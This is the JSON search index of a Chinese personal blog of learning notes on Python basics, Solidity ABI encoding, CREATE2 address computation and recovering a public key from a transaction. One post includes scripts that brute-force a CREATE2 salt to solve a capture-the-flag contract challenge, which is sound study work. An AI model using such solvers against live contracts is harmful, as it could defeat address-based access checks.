{"meta":{"title":"笔友🍉の知识库","subtitle":"","description":"Self-Discipline","author":"笔友🍉","url":"https://biyouqiuqiu.com","root":"/"},"pages":[{"title":"","date":"2023-05-31T23:45:14.074Z","updated":"2023-05-31T23:45:14.074Z","comments":true,"path":"about/index.html","permalink":"https://biyouqiuqiu.com/about/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2023-05-31T23:46:33.843Z","updated":"2023-05-31T23:46:33.843Z","comments":true,"path":"friends/index.html","permalink":"https://biyouqiuqiu.com/friends/index.html","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"},{"title":"所有分类","date":"2023-05-31T23:45:51.441Z","updated":"2023-05-31T23:45:51.441Z","comments":true,"path":"categories/index.html","permalink":"https://biyouqiuqiu.com/categories/index.html","excerpt":"","text":""},{"title":"Good article recommended","date":"2023-04-07T00:59:10.000Z","updated":"2023-04-07T00:59:10.000Z","comments":true,"path":"collectings/Good article recommended.html","permalink":"https://biyouqiuqiu.com/collectings/Good%20article%20recommended.html","excerpt":"","text":"Good article recommended1. 关于 EVM的存储，storage 和 slot：https://learnblockchain.cn/article/42662. 以太坊智能合约中随机数预测: https://www.freebuf.com/vuls/179173.html3. 有关数组在内存的储存 ：https://learnblockchain.cn/article/45744. 与动态数组存储、结构体相关且求数组的存储位置的：https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/ 5. 一个智能合约可以存储256bit的key（2 ^ 256个key），每个key可以存储256bit的value，即2^261bytes 的数据6. 以太坊中的签名和认证7. 以太坊：账户交易过程分析"},{"title":"随笔","date":"2023-06-02T02:19:31.985Z","updated":"2023-06-02T02:19:31.985Z","comments":true,"path":"informal essay/index.html","permalink":"https://biyouqiuqiu.com/informal%20essay/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2023-06-01T04:44:20.604Z","updated":"2023-06-01T04:44:20.604Z","comments":true,"path":"tags/index.html","permalink":"https://biyouqiuqiu.com/tags/index.html","excerpt":"","text":""},{"title":"good_articles","date":"2023-06-02T02:50:09.608Z","updated":"2023-06-02T02:50:09.608Z","comments":true,"path":"collectings/index.html","permalink":"https://biyouqiuqiu.com/collectings/index.html","excerpt":"","text":""}],"posts":[{"title":"python网课笔记","slug":"Python/Basic_Knowledge/python网课笔记","date":"2023-06-02T16:18:01.000Z","updated":"2023-06-02T16:18:01.000Z","comments":true,"path":"2023/06/03/Python/Basic_Knowledge/python网课笔记/","link":"","permalink":"https://biyouqiuqiu.com/2023/06/03/Python/Basic_Knowledge/python%E7%BD%91%E8%AF%BE%E7%AC%94%E8%AE%B0/","excerpt":"","text":"B站python视频链接day011. open()函数在 Python 中，open() 函数可以用来打开文件并操作文件。 open() 函数的语法如下： 1open(file, mode=&#x27;r&#x27;, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) 其中，参数： file：要打开的文件名（包括文件路径）。 mode：打开文件的模式，默认为只读模式 &#39;r&#39;，还可选写入模式 &#39;w&#39;，追加模式 &#39;a&#39;，二进制模式 &#39;b&#39; 和读写模式 &#39;+&#39; 等。 buffering：缓冲策略，0 表示不缓冲，1 表示缓冲一行，大于 1 表示缓冲区大小（单位为字节）。 encoding：指定文件编码方式，默认为 None，即使用系统默认的编码方式。 errors：指定编解码错误处理方案，默认为 &#39;strict&#39;，即遇到错误会抛出异常。 newline：指定写入文件时使用的换行符，可选值有 None、&#39;&#39;、&#39;\\n&#39;、&#39;\\r&#39; 和 &#39;\\r\\n&#39;。 closefd：当使用文件描述符时，如果值为 False，则不关闭底层文件描述符。 opener：一个可选的自定义打开器，用于通过自定义方式打开文件。 执行如下代码，将在E:/下生成一个temp.txt文件 12345# open() 函数# a+表示文件夹不存在就新建，存在的话就追加内容fp = open(&quot;E:/temp.txt&quot;,&quot;a+&quot;,encoding=&quot;UTF-8&quot;)print(&quot;第一次使用open函数&quot;,file=fp)fp.close 2. 原字符 — 使转义字符不生效不希望字符串中的转义字符起作用，就使用原字符 — 使用方法：在字符串前加上r或R 3. 数据类型3.1 整数类型有关进制的pyhton中的表现 3. 2 浮点类型 3.3 浮点类型 3.4 字符串类型 4. 数据类型转换 4.1 int类型转str类型 解决办法： 1print(&#x27;我叫&#x27;+name+&#x27;,今年&#x27;+str(age)+&#x27;岁&#x27;) #将int类型的age转成字符串类型 4.2 其他类型转成str类型 4.3 int()将其他类型转为int类型注：int()不能转小数串或者文字串 4.4 float() 将其他类型转为float类型注：float()不能转文字串 5.python中的注释 6. inputh()函数注：input()函数输入的结果是字符串类型 7.运算符 7.1 基本算术运算语言的运算符的使用方式大差不差，python中要注意的是： 123print(1/2)#结果是0.5，区别于java(具体看如何定义的吧，如果1定义为int类型，则结果是0)print(11//2) #结果是5，`//`表示整除print(2**3) #结果是8，表示2的3次方 7.2 复杂算数运算（涉及正负数运算）整除 //:需要向下取整 求余%: 公式 &#x3D;&gt; 余数=被除数-除数*商 7.3 赋值运算符注：运算顺序从右到左 7.4 比较运算符 注：比较运算符的结果是bool类型 7.5 布尔运算 7.6 位运算符 8.id()的使用 在Python中，对于一些简单的对象类型（如整数、浮点数、布尔值等），如果它们的值相同，那么它们的id也相同。这是因为Python中对这些对象类型进行了优化，将某些常用的对象缓存起来，使得在程序中多次使用相同的值时，它们的id是相同的。 例如，对于整数对象，Python将[-5, 256]范围内的整数缓存起来，因此如果两个整数变量的值在这个范围内且相同，它们的id就相同。 示例代码： 1234a = 10b = 10print(id(a)) # 输出：140735263730704print(id(b)) # 输出：140735263730704 但对于其他对象类型（如列表、元组、字典等），如果它们的值相同，它们的id不一定相同，因为它们是不同的对象。 示例代码： 1234a = [1, 2, 3]b = [1, 2, 3]print(id(a)) # 输出：140735263499528print(id(b)) # 输出：140735263501256 test：","categories":[{"name":"Python","slug":"Python","permalink":"https://biyouqiuqiu.com/categories/Python/"},{"name":"Basic_Knowledge","slug":"Python/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Python/Basic-Knowledge/"}],"tags":[{"name":"python","slug":"python","permalink":"https://biyouqiuqiu.com/tags/python/"}]},{"title":"calAddressByCreate2","slug":"Solidity/Basic_Knowledge/calAddressByCreate2","date":"2023-05-25T15:10:10.000Z","updated":"2023-05-25T15:10:10.000Z","comments":true,"path":"2023/05/25/Solidity/Basic_Knowledge/calAddressByCreate2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/25/Solidity/Basic_Knowledge/calAddressByCreate2/","excerpt":"","text":"calAddressByCreate21. 【使用python】这里是借鉴张学长的🤣 1.1 安装web3库1pip install web3 1.2 计算代码12345678910111213141516171819202122232425262728from web3 import Web3# value of your address(this) # must delet 0x# example：0x5B38Da6a701c568545dCfcB03FcB875f56beddC4address = &quot;5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;# 固定常量 0xffconst_value = &quot;0xff&quot;# 将前两个值拼接起来s1 = const_value + address# 这个为代部署合约的字节码，可以通过keccak256(abi.encodePacked(bytecode))来计算s3 = &#x27;&#x27;i = 0while(True): salt = hex(i)[2:].rjust(64, &#x27;0&#x27;) s = s1+salt+s3 hashed = Web3.keccak(hexstr=s) hashed_str = &#x27;&#x27;.join([&#x27;%02x&#x27; % b for b in hashed]) if &#x27;badc0de&#x27; in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(hashed) python暂时没学好，等过段时间再回来解读 2.【使用ethereumjs】2.1 安装ethereumjs库1npm install ethereumjs-util 2.2 计算代码bytecode的值前要填 0x 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const eth = require(&#x27;ethereumjs-util&#x27;);// a. 常数const const_num = &quot;0xFF&quot;;// b. 创建者地址（合约地址）// 一般情况下是： address(this)// 拼接的时候不能包含 `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. 拼接 const str1 = const_num + contract_add.slice(2,contract_add.length);// 4. 代部署合约的字节码的hash值 const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;let bytecodeToHash = eth.bufferToHex(eth.keccakFromHexString(bytecode));// 去掉0xbytecodeToHash = bytecodeToHash.slice(2, bytecodeToHash.length);let salt = 0;while (true) &#123; // 1. Convert i to hex, and it pad to 32 bytes: // 1. 将i转为16进制的字符串，padStart右对齐，用 0 补齐32bytes // var saltToBytes = salt.toString(16).padStart(64, &#x27;0&#x27;); let saltToHex = &quot;0x&quot; + salt.toString(16); let saltToHash = eth.bufferToHex(eth.keccakFromHexString(saltToHex)); saltToHash = saltToHash.slice(2, saltToHash.length); // 2. Concatenate this between the other 2 strings // 2. 将 string1 saltToBytes string2三个字段的值拼接在一起 var concatString = str1.concat(saltToHash).concat(bytecodeToHash); /** * 3. Hash the resulting string * 对上行代码的 concatString 进行hash： * eth.keccakFromHexString() 是 Ethereum.js 库中的一个方法， * 用于对一个十六进制字符串进行 Keccak-256 哈希运算返回值类型为 Buffer * */ var hashed = eth.bufferToHex(eth.keccakFromHexString(concatString)); // 这个不对 因为 eth.keccak256()的参数不支持string类型，只支持Buffer类型 // var hashed = eth.bufferToHex(eth.keccak256(concatString)) // 4. Remove leading 0x and 12 bytes // 5. Check if the result contains badc0de // hashed.slice(26,20) if (hashed.slice(26, hashed.length).includes(&#x27;badc0de&#x27;)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hashed.slice(26, hashed.length)&#125;`); break; &#125; salt++;&#125; 3. 【ethersjs】3. 1 安装ethersjs库1npm install ethers 3.2 计算代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import &#123; ethers &#125; from &quot;ethers&quot;/** * create2 计算合约地址所需要的四个值 * * 1. 0xFF：一个常数，避免和CREATE冲突 2. 创建者地址 3. salt（盐）：一个创建者给定的数值 4. 待部署合约的字节码（bytecode） */// 1. 常数const const_num = &quot;0xFF&quot;;// 2. 创建者地址（合约地址）// 一般情况下是： address(this)// 拼接的时候不能包含 `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. 拼接 let str1 = const_num + contract_add.slice(2,contract_add.length);// 4. 代部署合约的字节码的hash值const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;// 5.1 对bytecode 进行hash运算 这个只能用单引号// solidityKeccak256([&#x27;bytes&#x27;],[bytecode]) &lt;=&gt; keccak256(abi.encodePacked(bytecode))const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);// 5.2 下面这行代码也行，因为对 bytecode进行紧打包的结果不变// const bytecodeToHash = ethers.utils.keccak256(bytecode);// console.log(bytecodeToHash)// 5. 定义一个盐，以及一个所求字段let salt = 0;const value = &quot;badc0de&quot;; // CTF靶场的题// 遍历出指定值，求出saltwhile (true) &#123; // 将salt转为16进制，用0填充为64位 // let saltToBytes = salt.toString(16).padStart(64, 0).toString(); let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length); // 再次拼接 顺序： 常数 创建者地址 盐 字节码的hash值 // bytecodeToHash.slice(2,bytecodeToHash.length): 删除 `0x` let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); // 对 str2 进行hash let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); // console.log(saltBuffer) // 先将打包好的str2 转为 utf8的字节数组 // let saltUtf8Bytes = ethers.utils.toUtf8Bytes(str2); // 将 saltUtf8Bytes 转化为buffer // let saltBuffer = ethers.utils.arrayify(saltUtf8Bytes); // 对 saltBuffer 进行hash // let hash = ethers.utils.keccak256(str2); //判断 是否满足条件 if (hash.slice(26, hash.length).includes(value)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; 搭配使用的solidity代码 计算地址： 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // 固定的一个字节的常数 0xff addToDeploy, //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ))); &#125;&#125; 4. 推荐使用 ethersjs","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"encode && encodePacked","slug":"Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked","date":"2023-05-24T08:10:10.000Z","updated":"2023-05-24T08:10:10.000Z","comments":true,"path":"2023/05/24/Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/24/Solidity/Basic_Knowledge/abi.encode&&abi.encodePacked/","excerpt":"","text":"abi.encode 和 abi.encodePacked的区别abi编码的详解 移步&#x3D;&#x3D;&#x3D;》1.abi.encode abi.encode 将它的每个参数填充为32字节【32 * 8 &#x3D;256位】（1byte &#x3D; 8bit）的数据，并拼接在一起。 注：如果要和合约交互，使用的是abi.encode（实践操作） 1.1 abi.encode编码演示定义的变量： 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; 代码1： num1是uint8类型，占用1个字节 123function testABIEncode1() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num1, _addr, name, bs1); &#125; 代码2： num2是uint256类型，占用32个字节 123function testABIEncode2() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num2, _addr, name, bs1);&#125; 看运行结果： 由运行结果 比较num1 和num2的编码值可知，不管参数的数据类型是什么，它都将参数填充为32位。所以这两个函数的编码结果相同。 1.2 abi.encode 与合约交互 —- 以create2为例create2 的使用请移步 &#x3D;&#x3D;&#x3D;》 【abi.encode】通过 abi.encode对要部署合约的字节码和代传参数（id &#x3D; 1, name &#x3D; “biyou”）进行“非紧”打包： 123456// 非紧打包 -- 涉及了合约构造函数的参数 function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行紧打包 result = abi.encodePacked(temp, abi.encode(id,name));&#125; 运行结果的部分截图： 将获取的bytecode的值，放入create2Address函数中,传入盐salt（biyou），计算 Student合约的地址 create2Address函数代码： 123456789101112131415function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ) ) ); &#125; 运行结果： 再将获取的地址通过remix上的At Address获取合约，并调用其中的函数检验结果： At Address: 验证结果（正确）： 【abi.encodePacked】通过 abi.encodePacked对要部署合约的字节码和代传参数（id &#x3D; 1, name &#x3D; “biyou”）进行“非紧”打包： 12345// 紧打包function encodePackedBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; result = abi.encodePacked(temp, abi.encodePacked(id,name));&#125; 运行结果的部分截图： 将获取的bytecode的值，放入create2Address函数中,传入盐salt（biyou），计算 Student合约的地址 create2Address函数同上 运行结果： 再将获取的地址通过remix上的At Address获取合约，并调用其中的函数检验结果： At Address: 运行结果（出错）： 2. abi.encodePacked2.1 编码演示 将给定参数根据其所需最低空间编码。类似于abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据 的hash时。 最低空间编码（个人理解）: 因为在以太坊EVM中的ABI，默认给每个属性（字段）赋予一个 32字节（32 * 8 &#x3D; 256位）的长度（不足部分被0填充）, 实际占用长度取决于属性的类型。 整型： 1&gt;uint8 num = 1; // 这个占用8bit，即一个字节，前面将填充31 * 8 个零，又因为在以太坊中数据一般格式为16进制，16进制数的一位占四个 xxxx(x是0或1) 例： 0xff = 11111111 这样前面显示的0的个数为 31 * 8 &#x2F; 4 &#x3D; 62个（uint8 num &#x3D; 1，本身表示为：0x01） 所以使用abi.encodePacked打包，将会是保留uint8本身的长度（8位）即1字节即0x01， 如图： 1&gt;uint256 num2 = 1;//占用 256位，即 0x0000000000000000000000000000000000000000000000000000000000000001，因为num2声明为uint256明确指明了占用256位，所以EVM会给num2分配的最低空间为 256位 所以使用abi.encodePacked打包，将会是保留uint256本身的长度（256位）即32字节 如图： bytesn（n的范围是[1,32]）类型：和uint类型类似 bytes1 &#x3D;&#x3D;&gt; uint8 关于 bytes家族移步&#x3D;&#x3D;》 string类型： 将字符串转为bytes类型之后实际有多长就保留多长 字符串转bytes代码： 123function stingConvertBytes(string memory _str) external pure returns(bytes memory result)&#123; result = abi.encodePacked(_str);&#125; address类型： 因为address是160位的，所以只保留160位即可 定义的变量： 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; 代码1： num1是uint8类型，占用1个字节 num2是uint256类型，占用32个字节 _addr是address类型，占用20个字节 name是string类型，占用字节数取决于实际情况长度 bs1是bytes1类型，占用1个字节 123function testABIEncodePacked1() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num1, _addr, name, bs1);&#125; 结果： 代码2： &#96;&#96;num1是uint8类型，占用1个字节&#96; num2是uint256类型，占用32个字节 _addr是address类型，占用20个字节 name是string类型，占用字节数取决于实际情况长度 bs1是bytes1类型，占用1个字节 123function testABIEncodePacked2() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num2, _addr, name, bs1);&#125; 看运行结果： 3. 总结不需要和其他合约交互的时候大多选择 abi.encodePacked的打包方式，包括签名操作什么的 需要与其他合约进行交互的则选择abi.encode的打包方式—其他的合约交互正在学习","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"}]},{"title":"Create2","slug":"Solidity/Basic_Knowledge/Create2","date":"2023-05-23T08:10:10.000Z","updated":"2023-05-23T08:10:10.000Z","comments":true,"path":"2023/05/23/Solidity/Basic_Knowledge/Create2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/23/Solidity/Basic_Knowledge/Create2/","excerpt":"","text":"Create &amp;&amp; Create 21. create1.1 简介 概念： 智能合约可以由其他合约和普通账户利用 create操作码创建。在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和nonce(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。 计算式： 新地址 = hash(创建者地址, nonce) 创建者地址不会变，但nonce可能会随时间而改变，因此create创建的合约地址不好预测。 2.create22.1 简介 create2的用法和create有点类型，同样是new一个合约，并传入新合约构造函数所需的参数，不同点在于要多传入一个salt（盐）参数： 1Contract X = new Contract&#123;salt: _salt, value: _value&#125;(params); 解读：Contract是要创建的合约名，X是合约对象（address），_salt是指定的盐；如果构造函数是payable，可以在创建时传入_value数量的ETH，params是新合约构造函数的参数。 2.2 计算create2地址注：如果需要进行合约交互，且待部署合约的构造器带参，则需要对待传参数进行abi.encode()打包，再使用 abi.encodePacked()对bytecode和abi.encode()的结果进行紧打包 如代码所示： 123456function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode 写死 bytes memory temp = type(Student).creationCode; // 这里的参数值我写死了（Student 构造器的参数） result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; ❗❗❗abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)) 外层的abi.encodePacked()将不会对abi.encode(1,&quot;biyou&quot;)的值进行紧打包了，举例如下： 代码1： 1234567// 非紧打包 -- 涉及了合约构造函数的参数function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行紧打包 result = abi.encodePacked(temp, abi.encode(id,name));&#125; 结果1： 代码2： 123456// 非紧打包 -- 涉及了合约构造函数的参数function encodeBycode1(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行非紧打包 result = abi.encode(temp, abi.encode(id,name));&#125; 结果2： 测试合约； 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// 一个用于测试的合约contract Student &#123; uint256 public id ; string public name; constructor(uint256 _id, string memory _name) &#123; id = _id; name = _name; &#125; function getId() external view returns(uint256) &#123; return id; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// create2合约contract create2 &#123; // 使用create2计算地址,我只需要改变salt(string类型)的值就可以就算出不一样的地址 function create2Address(string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包后再进行hash keccak256(getBycode()) //获取要计算的合约的字节码 再进行hash )) ) ) ); &#125; // 使用create2计算地址,传入代部署合约的字节码,我只需要改变salt(string类型)的值就可以就算出不一样的地址 function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ) ) ); &#125; // 获取部署合约的字节码（内部合约） function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode 写死 bytes memory temp = type(Student).creationCode; // 这里的参数值我写死了（Student 构造器的参数） result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; // 通过create2部署合约，new的形式 function makeSudentByCreate2(string memory _salt, uint256 id, string memory name) external returns(Student student)&#123; student = new Student&#123;salt: keccak256(abi.encodePacked(_salt))&#125;(id, name); &#125;&#125; 一个灵活一点的代码： 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // 固定的一个字节的常数 0xff addToDeploy, //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ))); &#125;&#125; 2.3 暴破求解create2地址————计算出 将来的地址合约含有某个字段操作方法 &#x3D;&#x3D;&#x3D;&#x3D;》计算指定合约地址（含某个字段） 相关链接","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"从交易获取公钥","slug":"Solidity/Basic_Knowledge/从交易获取哈希","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/从交易获取哈希/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/%E4%BB%8E%E4%BA%A4%E6%98%93%E8%8E%B7%E5%8F%96%E5%93%88%E5%B8%8C/","excerpt":"","text":"交易哈希 &#x3D;》公钥从一笔链上的交易哈希获取签名的公钥 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import &#123; ethers &#125; from &quot;ethers&quot;;// providerconst connection = &quot;&quot;;const provider = new ethers.providers.JsonRpcProvider(connection);// 交易的hashconst txHash = &quot;&quot;;// 获取交易信息const transaction = await provider.getTransaction(txHash);// console.log(`transaction =&gt; `,transaction); //打印交易详情// txData 对象内的字段缺一不可const txData = &#123; // gasPrice: transaction.gasPrice, // 这个不需要，否则会报错 gasLimit: transaction.gasLimit, value: transaction.value, nonce: transaction.nonce, data: transaction.data, to: transaction.to, chainId: transaction.chainId, type: transaction.type, maxFeePerGas: transaction.maxFeePerGas, maxPriorityFeePerGas: transaction.maxPriorityFeePerGas,&#125;// 对txData交易对象序列化为其原始二进制格式const signingData = ethers.utils.serializeTransaction(txData);// 对序列化后的交易对象进行hashconst msgHash = ethers.utils.keccak256(signingData);// 获取交易详情中的 r s vconst signature = &#123;r: transaction.r, s: transaction.s, v: transaction.v&#125;;// 获取原生未压缩的公钥，即 0x04 开头的let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);console.log(rawPublicKey);// 把开头的 0x04 字段删掉 ===》 将 `0x04` 替换成 `0x`rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;console.log(rawPublicKey); 